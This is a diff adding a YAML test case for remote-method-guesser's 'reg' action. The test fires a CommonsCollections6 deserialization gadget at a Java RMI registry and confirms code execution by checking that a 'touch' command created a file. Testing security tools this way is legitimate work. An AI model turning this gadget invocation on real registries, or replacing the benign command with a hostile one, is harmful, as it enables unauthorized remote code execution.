@@ -1,0 +1,30 @@
+tester:
+  name: reg
+  title: Registry Tests
+  description: >
+    "Performs tests on remote-methods-guessers 'reg' action."
+
+variables:
+  file: reg-rce-test.txt
+
+tests:
+  - title: Gadget Call
+    description: >
+      'Attempts a deserialization attack on the registry endpoint.'
+      'This should work, as the server runs a legacy version of Java.'
+
+    command: '${BASE-CMD}'
+    arguments:
+      - reg
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - probably successful
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
